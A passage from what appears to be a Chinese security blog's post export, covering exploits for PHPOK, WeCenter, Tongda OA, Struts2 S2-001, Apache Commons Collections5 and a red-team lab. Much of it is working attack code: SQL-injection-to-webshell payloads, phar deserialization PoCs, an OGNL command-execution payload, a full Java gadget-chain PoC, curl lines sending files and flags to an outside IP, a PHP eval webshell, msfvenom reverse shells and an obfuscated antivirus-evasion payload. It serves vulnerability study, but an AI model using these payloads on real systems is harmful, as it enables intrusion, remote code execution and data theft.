strlen($str);$i++)&#123; $hex .= dechex(ord($str[$i])); if(ord($str[$i]) == 0)&#123; $hex .= '0'; &#125; &#125; $hex = strtoupper($hex); return $hex;&#125;class cache&#123; protected $key_id = 'php://filter/write=convert.base64-decode/resource=tmp'; protected $key_list = 'aaPD9waHAgcGhwaW5mbygpOz8+'; protected $folder = '';&#125;$x = serialize(new cache);$x = strToHex($x);$sql = \"insert into qinggan_fields values(1233,21,'a','a','varchar','a','text','a','safe',200,200,0x$x,0,0,'','')\";echo $sql.\"\\n\";$a = ['m_picplayer'=&gt;['type_id'=&gt;'sql','sqlinfo'=&gt;$sql,'is_list'=&gt;true]];echo urlencode(json_encode($a));?&gt; 因为我之前传的ftype=21，下一步传id=41&amp;site_id=1 1%7B%22m_picplayer%22%3A%7B%22type_id%22%3A%22fields%22%2C%22pid%22%3A41%2C%22site%22%3A1%7D%7D 访问tmp.php 思路二、和phpok4.7一样通过sql注入添加上传附件php白名单和phpok4.7的区别在于insert into的注入点为mime_type framework/api/upload_control.php中的save_f() 跟进_upload() 因为新版本中添加了format()对文件名进行过滤，但是也增加了mimetype字段，并且我们可控。 POC编写 注意还增加了2字节的文件格式检查，加上对应即可 比如png=&gt;&#39;13780&#39;=&gt;%89P 先随便传个包然后general_log观察sql语句 1INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`mime_type`,`attr`,`session_id`,`user_id`) VALUES('1','res/202003/25/','','png','res/202003/25/beb3a68f4f90a030.png','1585119315','eval','image/jpeg','a:2:&#123;s:5:\"width\";N;s:6:\"height\";N;&#125;','6joq7hdmh7gf5bqrsphpc1via7','0') 构造将mimetype改为res/gqy.php 1eval&#39;,&#39;l&#39;,1,&#39;1&#39;),(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;jpg&#39;,0x7265732f6771792e706870,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;10&#39;,&#39;1&#39;)# （api/upload_control.php中只有save_f()方法） 再调用www/upload_control.php中的replace_f()方法，注意1422 1index.php?c&#x3D;upload&amp;f&#x3D;replace&amp;oldid&#x3D;1422 访问/res/gqy.php 总结现在传统的getshell很少直接出现。利用sql注入修改上传文件的文件名，修改数据库中对上传文件格式的设置，发现sql注入之后可以往这方面考虑能否扩大危害。 参考链接 https://xz.aliyun.com/t/1569 https://forum.90sec.com/t/topic/728/10 https://www.anquanke.com/post/id/194453","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"WeCenter_v3.3.4漏洞分析","slug":"WeCenter-v3-3-4漏洞分析","date":"2020-03-23T02:02:41.000Z","updated":"2020-04-02T03:48:32.812Z","comments":true,"path":"2020/03/23/WeCenter-v3-3-4漏洞分析/","link":"","permalink":"https://glotozz.github.io/2020/03/23/WeCenter-v3-3-4%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞分析 反序列化触发点 POP链 漏洞修复 总结 参考链接 反序列化点可以从两个方向进行寻找，一种是直接搜可控的 unserialize(可控) ，另一种是完全可控的文件名（利用 phar:// 协议触发反序列化）。 环境搭建 http://www.wecenter.com/downloads/ 漏洞分析api/admin_notify.php有个明显的XSS漏洞 反序列化触发点全局搜索unserialize( 全局搜索能触发phar反序列化的函数 先对链接中的漏洞进行分析，因为结果较多，再进行其他的漏洞挖掘 models/account.php 全局搜索调用associate_remote_avatar() app/account/ajax.php处可进一步利用，另外几处似乎是第三方登录提供 从users_weixin表中得到的headimgurl字段值，全局寻找这张表的update或者insert操作 models/openid/weixin/weixin.php 全局搜索bind_account() 调用这个方法，控制cookie即可插入数据库，配合之前的file_get_contents()触发phar反序列化 POP链全局搜索__destruct()和__construct() 任意文件删除 models/excel/PHPExcel/Shared/XMLWriter.php 或者system/Zend/Http/Response/Stream.php也存在任意文件删除 EXP 12345678910111213141516&lt;?php class PHPExcel_Shared_XMLWriter&#123; //网站根目录下的a.txt private $tempFileName = '../../../../../a.txt'; &#125; @unlink(\"phar.phar\"); $phar = new Phar(\"phar.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"GIF89a\".\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //设置stub，增加gif文件头 $o = new PHPExcel_Shared_XMLWriter(); $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; 这里注意不能在头像处进行文件上传，因为 得到路径 1&#x2F;WeCenter_3-3-4&#x2F;uploads&#x2F;question&#x2F;20200323&#x2F;251b7693d9eaabaad4a4c05e5227ada2.gif 生成json 1234567&lt;?php $arr = []; $arr['access_token']['openid'] = 1; $arr['access_user']['nickname'] = 'gqy'; $arr['access_user']['headimgurl'] = 'phar://uploads/question/20200323/251b7693d9eaabaad4a4c05e5227ada2.gif'; echo json_encode($arr);?&gt; 添加Cookie并访问/app/m/weixin.php的binding_action 通过下面的url格式调用方法 1&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;m&#x2F;weixin&#x2F;binding&#x2F; Cookie 1vmp__WXConnect&#x3D;&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:1&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;gqy&quot;,&quot;headimgurl&quot;:&quot;phar:\\&#x2F;\\&#x2F;uploads\\&#x2F;question\\&#x2F;20200323\\&#x2F;79595eac2a24794833379d4945e73c3c.gif&quot;&#125;&#125; 再调用app/account/ajax.php的synch_img_action()方法 1&#x2F;WeCenter_3-3-4&#x2F;?&#x2F;account&#x2F;ajax&#x2F;synch_img&#x2F; 但是发现第一处任意文件删除并不可行，在加载类时并没有成功，简单跟了一下没跟出来。。。 再试试第二处任意文件删除， 能进入加载类并进入__destruct()，但是还是没删除成功，原因不清楚 SQL注入 system/aws_model.inc.php 123class AWS_MODEL&#123; private $_shutdown_query = ['gqy'=&gt;'SELECT UPDATEXML(1, concat(0xa, user(), 0xa), 1)'];&#125; RCE 发现在后台存在一处设置上传白名单的地方 添加一个gqyy，通过查看sql执行语句可以发现是 那么直接添加一个php进去即可，注意转义 123class AWS_MODEL&#123; private $_shutdown_query = ['UPDATE `aws_system_setting` SET `value` = \\'s:45:\"jpg,jpeg,png,gif,zip,doc,docx,rar,pdf,psd,php\";\\' WHERE (`varname` = \\'allowed_upload_types\\')'];&#125; 漏洞修复v3.3.5官方仍未修复。。可以通过对headimgurl进行正则匹配禁止phar:// 总结整体挖掘思路还是很赞的，就是遇到一些奇怪的坑，还没解决。。。 之后挖掘一下v3.3.5的试试 参考链接 https://xz.aliyun.com/t/7077 https://mochazz.github.io/2020/01/16/WeCenter3.3.4SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE/#%E6%BC%8F%E6%B4%9E%E7%82%B9","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"通达OA最新文件上传+文件包含RCE","slug":"通达OA最新文件上传-文件包含RCE","date":"2020-03-22T00:52:11.000Z","updated":"2020-03-25T08:06:56.552Z","comments":true,"path":"2020/03/22/通达OA最新文件上传-文件包含RCE/","link":"","permalink":"https://glotozz.github.io/2020/03/22/%E9%80%9A%E8%BE%BEOA%E6%9C%80%E6%96%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABRCE/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 环境搭建 漏洞复现 漏洞分析 注意点 总结 参考链接 前两天爆出了通达OA的RCE漏洞，分析一下漏洞成因。 环境搭建 http://www.tongda2000.com/ 影响版本 tongdaOA V11tangdaOA 2017tangdaOA 2016tangdaOA 2015tangdaOA 2013 增强版tangdaOA 2013 通达OA的php文件采用的是zend54 加密，可以使用 SeayDzend工具进行解密 漏洞复现文件上传 路径/ispirit/im/upload.php 文件包含 路径/ispirit/interface/gateway.php 未成功，先分析再回来看是为什么 漏洞分析/ispirit/im/upload.php 比较补丁前后的不同 auth.php是用户认证，所以未修复前通过传入$P即可绕过登录验证，$P的意思是sessionid 接下来需要绕过一些简单的判断，$DEST_UID只能是数字和逗号组成，存在逗号则intval()处理，传为0时，UPLOAD_MODE不能为2 if (1 &lt;= count($_FILES))即可文件上传 跟进upload()函数 跟进is_uploadable() 后缀不能为php，以及黑名单验证。我们传phtml，或者jpg，配合文件包含。事实上这里上传的文件路径无法直接访问，只能通过文件包含 构造如下 1234567&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; &lt;input name&#x3D;&quot;UPLOAD_MODE&quot; value&#x3D;&quot;1&quot;&#x2F;&gt; &lt;input name&#x3D;&quot;P&quot; value&#x3D;&quot;123&quot;&#x2F;&gt; &lt;input name&#x3D;&quot;DEST_UID&quot; value&#x3D;&quot;1&quot;&#x2F;&gt; &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;ATTACHMENT&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;上传文件&quot; &#x2F;&gt;&lt;&#x2F;form&gt; /ispirit/interface/gateway.php 修复后过滤了..防止目录穿越 传入一个json格式的url即可，字符串中需要包含general/或者ispirit或者module/ 1json&#x3D;&#123;&quot;url&quot;: &quot;..&#x2F;..&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2003&#x2F;914853445.jpg&quot;&#125; phpinfo() 注意点通达OA开启了 disable_funcation 功能 很多常见的命令执行函数如 exec、eval、system等都被禁止了。这也是我一开始失败的原因。 查看配置文件 常用的命令执行函数还有popen()没过滤 123$file &#x3D; popen(&quot;ipconfig&quot;,&quot;w&quot;);&#x2F;&#x2F;some code to be executedpclose($file); 但是注意没有回显，可反弹shell或者curl带出 或者参考链接里面的方法bypass disable_func window com组件(php 5.4) 12345678&lt;?php$command&#x3D;$_GET[&#39;a&#39;];$wsh &#x3D; new COM(&#39;WScript.shell&#39;); &#x2F;&#x2F; 生成一个COM对象 Shell.Application也能$exec &#x3D; $wsh-&gt;exec(&quot;cmd &#x2F;c&quot;.$command); &#x2F;&#x2F;调用对象方法来执行命令$stdout &#x3D; $exec-&gt;StdOut();$stroutput &#x3D; $stdout-&gt;ReadAll();echo $stroutput;?&gt; 总结对于这种zend加密的目前无法调试，还原的出来的源码无法正常运行。 这个漏洞还是容易分析的，也反映出很多现代cms仍然存在着安全问题，之后多分析新爆出的漏洞。 参考链接 https://www.freebuf.com/column/230871.html https://www.cnblogs.com/-qing-/p/10944118.html","categories":[],"tags":[{"name":"php代码审计","slug":"php代码审计","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Java漏洞学习—S2-001","slug":"Java漏洞学习—S2-00","date":"2020-03-21T03:55:49.000Z","updated":"2020-03-28T00:24:42.499Z","comments":true,"path":"2020/03/21/Java漏洞学习—S2-00/","link":"","permalink":"https://glotozz.github.io/2020/03/21/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E2%80%94S2-00/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 预备知识 环境搭建 漏洞复现 原理分析 漏洞修复 总结 参考链接 今天看下Struts2经典漏洞，掌握代码层面的原理。 预备知识 Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。 Struts Core(浅蓝色)：Struts2的核心部分。 Interceptors(浅绿色)：Struts2的拦截器。 User created(浅黄色)：需要开发人员创建的部分。 具体原理可以参考链接或者strtus官方文档 环境搭建影响范围：WebWork 2.2.0-WebWork 2.2.5，Struts 2.0.0-Struts 2.0.8 maven搭建 123456789&lt;dependencies&gt; &lt;!-- struts2依赖包 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt; &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt; &lt;version&gt;2.0.8&lt;&#x2F;version&gt; &lt;&#x2F;dependency&gt; &lt;&#x2F;dependencies&gt; 注意maven/conf/settings.xml加个镜像 123456&lt;mirror&gt; &lt;id&gt;nexus-aliyun&lt;&#x2F;id&gt; &lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt; &lt;name&gt;Nexus aliyun&lt;&#x2F;name&gt; &lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&lt;&#x2F;url&gt; &lt;&#x2F;mirror&gt; 先创建一个Java项目 然后Add Framework Support 先导入maven下载struts 再次Add Framework Support，这时选中struts，jar包就是之前maven下好的包 添加Tomcat启动即可，如果出现报错，Project Settings-&gt;Artifacts再配置一下 成功启动 源码： https://github.com/vulhub/vulhub 漏洞复现获取tomcat路径 1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; 命令执行 1%&#123;#a&#x3D;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),#b&#x3D;#a.getInputStream(),#c&#x3D;new java.io.InputStreamReader(#b),#d&#x3D;new java.io.BufferedReader(#c),#e&#x3D;new char[50000],#d.read(#e),#f&#x3D;#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125; 原理分析在LoginAction上打个断点 1invokeAction:404, DefaultActionInvocation (com.opensymphony.xwork2) 在DefaultActionInvocation类中反射调用了我们的类 漏洞是出现在Struts2重新渲染jsp时，对ognl表达式进行了递归解析，导致了恶意的表达式被执行。 主要是在xwork-2.0.3-sources.jar!/com/opensymphony/xwork2/util/TextParseUtil.java 查到该方法的作用是将变量转换为对象 首先看到有个while(True)，之后就是先转化为%{xxx}的格式，利用ongl解析， 1Object o &#x3D; stack.findValue(var, asType); 比如%{username}解析为我们传入的值%{1+1}，而%{1+1}解析为2，2不满足规则， 跳出循环 漏洞修复在xwork2.0.4中， 添加了一个maxLoopCount属性，限制了递归解析的最大数目。 总结搭环境2h，调试20min，分析5min。。。 还没有对ongl的解析代码进行分析，有空再看 参考链接 https://mengsec.com/2019/10/29/Java-Web-S2-001/ https://struts.apache.org/core-developers/big-picture https://www.dazhuanlan.com/2020/01/19/5e23f4801e064/ https://struts.apache.org/maven/struts2-core/apidocs/index.html","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Java反序列化漏洞-Apache Commons Collections5","slug":"Java反序列化漏洞-Apache Commons Collections5","date":"2020-03-20T03:00:55.000Z","updated":"2020-04-20T15:23:53.484Z","comments":true,"path":"2020/03/20/Java反序列化漏洞-Apache Commons Collections5/","link":"","permalink":"https://glotozz.github.io/2020/03/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Apache%20Commons%20Collections5/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 预备知识 环境搭建 漏洞分析 总结 参考链接 预备知识Java中的反序列化readObject 原理不再赘述。 在重写readObject()方法时会写一些正常的操作，结合Java的反射机制便可以构造利用链。 Java的反射机制 下面摘自p牛的小密圈 反射是大多数语言里都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的方法可以调用，总之通过“反射”，我们可以将Java这种静态语言附加上动态特性。 1234public void execute(String className, String methodName) throws Exception &#123; Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance());&#125; 获取类的方法： forName实例例化类对象的方法： newInstance获取函数的方法： getMethod执行函数的方法： invoke 上面的execute方法就可以执行classNmae类的methodName方法 环境搭建引入commons-collections maven搭建 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt;&lt;/dependency&gt; 版本&lt;=3.2.1存在漏洞。 漏洞分析Apache Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer。 \\org\\apache\\commons\\collections\\functors\\InvokerTransformer.class 和我上面的例子很像，传入的参数是input是一个实例化对象，调用的方法iMethodName和参数iArgs都是InvokerTransformer实例化时设定的。所以利用这个方法便可以调用任意对象的任意方法。 想到常用的命令执行构造Runtime.getRuntime().exec(cmd) 123456Transformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;);invokerTransformer.transform(Runtime.getRuntime()); 成功执行 但是有时候我们需要递归调用对象也是支持的，commons-collections的ChainedTransformer类中封装好了了递归调用这个方法 测试代码 12345678Transformer[] transformers = new Transformer[] &#123; new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(Runtime.getRuntime()); new一个InvokerTransformer对象，传入要执行方法和参数，放入数组即可 接下来就是寻找反序列化的触发点。 这里首先用到了ConstantTransformer，内置的一个类，会将参数原样返回。 因此构造 12345678Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;)&#125;;Transformer transformerChain = new ChainedTransformer(transformers); 但是序列化的时候报错Exception in thread &quot;main&quot; java.io.NotSerializableException: java.lang.Runtime 因为Runtime实例化对象是不允许序列化的，所以不能直接传入实例化的对象，Runtime是利用getRuntime静态方法实例化的，所以就是获取到这个方法。 可以参考p牛之前解决Runtime不能newInstance()的代码，虽然当时解决的是Runtime类是单例模式这个特性 12345Class clazz = Class.forName(\"java.lang.Runtime\");Method getRuntimeMethod = clazz.getMethod(\"getRuntime\");Object runtime = getRuntimeMethod.invoke(clazz);Method execMethod = clazz.getMethod(\"exec\", String.class);execMethod.invoke(runtime, \"calc.exe\"); 第一次的object由我们传入，之后的调用形式为method.invoke(object,args) 那么首先传入一个Runtime.class，反射调用getRuntime，返回getRuntimeMethod， 反射调用invoke，返回Runtime实例对象，反射调用exec命令执行 参考链接代码 1234567891011121314151617Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;;Transformer transformerChain = new ChainedTransformer(transformers); 但是还是需要调用一下transform()方法才能触发。 找到LazyMap类的get方法，发现里面调用了factory实例化的transform方法。 全局搜索get()方法，找到TiedMapEntry类的toString()和getValue()方法 Java中的toString方法是和PHP中的__toString魔术方法有相同的作用的，当将这个对象当做字符串处理的时候会自动调用这个方法。 toString()调用了getValue()， getValue方法调用了map实例的get方法 那么就可以构造了 12345Transformer transformerChain = new ChainedTransformer(transformers);Map innerMap = new HashMap();Map lazyMap = LazyMap.decorate(innerMap, transformerChain);TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); 这样反序列化entry对象后，还是需要System.out.println来触发toSring() 所以接下来我们找这样一个类：重写了readObject方法，并且对某个变量进行了字符串操作 看ysoserial的POC(cc5)直接利用了BadAttributeValueExpException类，这个类直接就调用了toString方法。 BadAttributeValueExpException类 所以将BadAttributeValueExpException类实例化，val变量赋值为TiedMapEntry的实例化对象，反序列化的时候便会触发命令执行。 有一点就是val是私有属性，没有提供set()，需要使用反射来赋值 1234567891011121314151617package com.company;import java.lang.reflect.Field;public class Test &#123; private String readOnly; public String getReadOnly() &#123; return readOnly; &#125; public static void main(String[] args) throws SecurityException, NoSuchFieldException, IllegalArgumentException, IllegalAccessException &#123; Test t = new Test(); Field f = t.getClass().getDeclaredField(\"readOnly\"); f.setAccessible(true); f.set(t, \"test\"); System.out.println(t.getReadOnly()); &#125;&#125; 最终POC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061package com.company;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException &#123; Transformer[] transformers = new Transformer[] &#123; //传入Runtime类 new ConstantTransformer(Runtime.class), //反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法 new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), //反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象 new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //反射调用exec方法 new InvokerTransformer(\"exec\", new Class[] &#123;String.class &#125;, new Object[] &#123;\"curl localhost:7999\"&#125;) &#125;; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); BadAttributeValueExpException poc = new BadAttributeValueExpException(null); // val是私有变量，所以利用下面方法进行赋值 Field valfield = poc.getClass().getDeclaredField(\"val\"); valfield.setAccessible(true); valfield.set(poc, entry); File f = new File(\"poc.txt\"); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(poc); out.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\"poc.txt\"); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 ois.readObject(); ois.close(); &#125;&#125; 通过传入字符串数组的方法带出更多数据，也可以反弹shell 1String[] cmd = &#123;\"/bin/sh\",\"-c\",\"curl http://174.0.223.65:2333/`/readflag`\"&#125;; 12345678910111213String[] execArgs = new String[] &#123; \"sh\", \"-c\", \"ifconfig &gt; /tmp/data &amp;&amp; curl localhost:7999/ -F 'file=@/tmp/data'\" &#125;;Transformer[] transformers = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;\"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123;String[].class &#125;, new Object[] &#123; execArgs &#125;)&#125;; 总结整条链不长，分析下来还是挺有意思的，这个漏洞还有一些其他的利用方式，有空继续看。 自己对java的一些语言特性还是不够了解。 链接里的师傅写的很详细，膜 参考链接 https://p0sec.net/index.php/archives/121/ https://zsxq.tricking.io/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"二品vulstack-1","slug":"二品vulstack-1","date":"2020-03-18T10:25:46.000Z","updated":"2020-03-25T08:06:31.098Z","comments":true,"path":"2020/03/18/二品vulstack-1/","link":"","permalink":"https://glotozz.github.io/2020/03/18/%E4%BA%8C%E5%93%81vulstack-1/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 一、环境搭建 二、信息收集 三、getshell 四、域渗透 msf提权方法 开启远程桌面连接 cs与msf联动 获取密码或hash 信息收集 内网收集 内网攻击姿势-MS08-067 mimikatz插件 内网攻击姿势-SMB远程桌面口令猜测 内网攻击姿势-Oracle数据库 TNS服务漏洞 内网攻击姿势-RPC DCOM服务漏洞 内网攻击姿势- MS17-010 钓鱼攻击 内网其他主机端口-redis Getshell PTH 域渗透-横向移动[wmi利用] 内网其它主机端口-代理转发 Frp内网穿透 CS上线内网主机 SSH隧道 持久控制 HTTP Listener交互信息隐藏 SSP 金票利用 后门植入 痕迹清理 总结 参考链接 昨天看到红日安全发了vulstack-1的wp，写的很详细，很多思路在我第一次做的时候都没有用到，于是打算跟着wp再学习一下。 一、环境搭建win7-仅主机+NAT win2003-仅主机 win2008-仅主机 网络拓扑图 边界机win7：192.168.52.143，169.254.129.186 域成员win2003：192.168.52.141 域控win2008：192.168.52.138 测试连通性 win7可以ping通另两台，但是另外两台ping不通win7， 可能由于Win7开启了防火墙且过滤了ICMP数据包，所以在后续信息收集阶段的活跃主机探测时不能使用-sP. 二、信息收集探测主机 1nmap -sn 192.168.56.0&#x2F;24 得到目标ip为192.168.56.129 端口扫描 1nmap -sS -sV -T5 -A -p- 192.168.1.129 目录扫描 1gobuster dir -u http:&#x2F;&#x2F;192.168.1.129 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;SecLists&#x2F;Discovery&#x2F;Web-Content&#x2F;raft-large-directories.txt -x .php,.txt,.html 那个beifen.rar没扫出来，字典不够强大，略过 三、getshell存在phpmyadmin以及phpinfo.php root/root弱口令登录，phpinfo.php查看网站绝对路径C:/phpStudy/WWW 查看sql语句能否文件写入 1show variables like &#39;%secure%&#39; secure_file_priv=NULL 因此无法通过into outfile写入 这里可以通过mysql日志写入的方式getshell 12set global general_log &#x3D; &quot;ON&quot;SET global general_log_file&#x3D;&quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;eval.php&quot; 插入一句话 1SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;; 蚁剑连接成功 四、域渗透1ipconfig &#x2F;all 发现在god.org域中 首先给msf弹个shell，因为存在web服务，我们用msfvenom生成一个shellcode，而不是pe文件 1msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.129 LPORT&#x3D;3333 -f raw &gt; test.php 这里显然没有杀软，如果有，之前的一句话木马应该是写不进去的 免杀payload 加密 123$code = file_get_contents('test.php');$encode = base64_encode(gzdeflate($code));echo $encode; 黑名单 123456789101112$l = 'baSe6';$o = '4_dE';$v = 'cO';$e = 'DE';$love = $l.$o.$v.$e;$c = \"love\";$a = $$c('cGhwaW5mbygpOwo=');eval($a);$a = strrev('EdOcEd_46eSaB');$b = $a('cGhwaW5mbygpOwo=');eval($b); 综合上面两个，最后的test1.php 123456&lt;?php$a = strrev('EdOcEd_46eSaB');$c = strrev('eTALfNizG');$b = $a('lVNtb9MwEP4rpopmRyoZHQiNlkmUaSBE2RDtt2myHOfSWs3sKHb3oir/nbPd9IUxDfIp9j33vFwu0DSm4Q3UpnFKz9mbdEQSVZMzQgcfTrLB+9NskA1OTileewwW3uIzIqokjCWlB1rXgLjl1sglOC4rBdrRlBwdEWW5FFUl8goQm6ZkTRKLLUnJek7Ww+PjNYq1w3Xgbnte3HL3WMOOF5XboPYKW5FzI1p6OVODflEJFfrR/H/Qd2EQ4uBFifEX/u3yYtYn06vz73w6+3Ux/uEPEz47/+lVG/DITx2r0RqkY4ntkwN30QeCPXmhgKXe3b7nQLDvOZQ6ONWGRAgpV1pamu4hn4Ji2d4rJxcYfMclhYXtgIYkqUCjeonHIph+h405npajDhr5ttBN0L81dH4QeJhSYN9K10IuWe8Sq71+YPPji6SJuKb4Rm/wJvfTwDncL1QFhKFVrLAkT8lH0lH/Q7CcZPu5fOfrHdfzKUPfnyGf7W59vK+Tq8/jyfSa3tq576Q3PpIdPa0Et5tyeI+LAQ8OtFVG88qIAgpG7WphrOr+AK34HNz2NoMHkCtnmqxQ1i8thztR0c3eRgzPH2th7Vlcc+53xqEAoxTT5OF3OQDGLwUVDmNNPB0LqHbzFX8D');$d = $c($b);eval($d); msf开启监听 12345use exploit&#x2F;multi&#x2F;handlerset payload php&#x2F;meterpreter&#x2F;reverse_tcpset lhost 192.168.1.130set lport 3333exploit 进程迁移 注意：仅Windows本机meterpreter（windows / meterpreter / reverse_tcp）支持迁移。 from PHP meterpreter to native meterpreter with sessions -u 3 12psmigrate 2596 msf提权方法getsystem提权 12meterpreter &gt; getsystem[-] Unknown command: getsystem. exp提权 绕过UAC进行提权 123exploit&#x2F;windows&#x2F;local&#x2F;bypassuacexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_vbsexploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injection 提高程序运行级别 1exploit&#x2F;windows&#x2F;local&#x2F;ask windows提权漏洞 如ms13_053,ms14_058,ms16_016,ms16_032等 ================这里一开始出现了点问题 花了半天没搞好。。主要是网上基本没有相关的，还有个解答是msf的版本，但是我下了好几个版本+pro也不行。。。只有github上有个issue，只是提到了The target machine is Windows7 x64 不过最后还是解决啦 ===========================分割线 使用cobaltstrike 